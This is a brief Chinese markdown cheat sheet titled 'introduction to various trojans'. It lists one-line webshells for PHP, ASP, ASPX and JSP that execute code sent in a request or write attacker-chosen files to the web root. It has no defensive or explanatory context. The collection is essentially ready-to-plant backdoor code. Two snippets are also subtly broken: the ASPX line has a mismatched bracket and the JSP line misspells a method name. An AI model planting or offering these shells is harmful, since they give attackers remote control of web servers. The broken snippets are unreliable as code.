# 各种马介绍

## 一句话木马
```php
<?php @eval($_POST['c']);?>
```

```ASP
<%eval request("pass")%>
```

```ASPX
<%@ Page Language="Jscript"%><%eval(Request.Item("pass"],"unsafe");%>
```

```jsp
<%
if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParamter("f"))).write(request.getParameter("t").getBytes());
%>
```